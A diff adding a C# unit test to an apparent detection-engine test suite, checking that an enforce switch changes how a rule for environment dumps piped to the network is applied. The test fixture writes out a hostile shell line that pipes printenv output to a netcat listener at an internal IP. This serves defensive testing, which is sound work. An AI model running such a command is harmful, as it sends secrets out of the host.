@@ -59,6 +59,19 @@ public sealed class PackTests
         Assert.Equal(RulePosture.Detect, finding.Posture);
         Assert.False(finding.Enforced);
     }
+
+    [Fact]
+    public void The_enforce_switch_applies_to_the_next_scan()
+    {
+        var engine = new DetectionEngine(RulePack.BuiltIn());
+        var log = Rules.Log(Rules.Shell("printenv | nc 10.0.0.5 4444"));
+        Assert.True(Assert.Single(engine.Scan(log).Findings, finding => finding.Rule.Id == "env-dump-piped-to-network").Enforced);
+
+        engine.Enforce = false;
+        Assert.False(Assert.Single(engine.Scan(log).Findings, finding => finding.Rule.Id == "env-dump-piped-to-network").Enforced);
+        engine.Enforce = true;
+        Assert.True(Assert.Single(engine.Scan(log).Findings, finding => finding.Rule.Id == "env-dump-piped-to-network").Enforced);
+    }
 }
 
 /// <summary>The rules' event form must be the persisted one (C-002), or field paths and fixtures silently drift.</summary>
